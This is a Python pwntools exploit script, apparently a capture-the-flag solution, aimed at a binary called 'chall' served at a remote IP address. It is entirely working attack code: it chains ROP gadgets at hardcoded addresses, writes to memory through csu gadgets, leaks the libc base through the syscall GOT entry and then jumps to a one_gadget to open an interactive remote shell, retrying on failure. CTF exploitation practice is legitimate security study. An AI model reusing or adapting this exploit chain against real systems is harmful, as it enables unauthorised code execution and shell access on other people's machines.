from pwn import *

context.terminal = "tmux splitw -h".split()
context.binary = elf = ELF('chall')
libc = elf.libc
pop_r14_r15 = 0x00000000004013e0
pop_rsp_r13 = 0x00000000004013dd
pop_r13 = 0x00000000004013de
pushin = 0x0000000000401384
ret = 0x40101a
write_rbp = 0x000000000040113c
prdi = 0x00000000004013e3
prsi_pr15 = 0x00000000004013e1
popcsu = 0x00000000004013da
movcsu = 0x00000000004013c0
bss = 0x404068

def shellcode_time(where, what):
    res = b""
    for i in range(0,len(what),4):
        data = u32(what[i:i+4].ljust(4,b'\x00'))
        res += www(where + i, data)
    return res

def www(where, what):
    pay = p64(popcsu) + p64(what) + p64(where + 0x3d) + p64(0) * 4 + p64(write_rbp)
    return pay

conv = lambda x: [unpack(x[i:i+8],'all') for i in range(0,len(x),8)]

while True:
    p = remote('34.101.122.7', 10001)
    #p = elf.process()
    #gdb.attach(p, "b * read+104\nc")
    pay = b'A'
    pay = pay.ljust(128, b'A')
    pay = pay.ljust(256, b'B')
    pay = pay.ljust(256+128, b'C')
    p.sendafter(b': ', pay)

    payload = p64(ret) + p64(prdi) + p64(0x404100) + p64(prsi_pr15) + p64(0x50) * 2 + p64(elf.sym.read) + p64(ret) * (6+16)
    payload += p64(popcsu) + p64(0) + p64(1) + p64(1) + p64(1) + p64(elf.got.syscall) + p64(elf.got.syscall) + p64(movcsu) + p64(0) * 7 + p64(ret) * (16)
    payload += p64(elf.sym.main)
    try:
        p.sendlineafter(b': ',cyclic(9,n=8)+ payload)
        p.sendline(b'\xfb' * 80)
        leak = p.recvuntil(b'Welcome')[:-7]
        leak = conv(leak)[0]
        libc.address = leak - libc.sym.syscall
        one_gadget = libc.address + 0xe3afe
        print(hex(libc.address))
        print(hex(one_gadget))
        pause()
        p.sendafter(b": ", b'X' * 24 + b'\xf8')
        p.sendlineafter(b': ', cyclic(88,n=8) +p64(ret)+ p64(one_gadget))
        p.sendline(b'ls')
        p.interactive()
    except KeyboardInterrupt:
        break
    except EOFError:
        p.close()
        continue
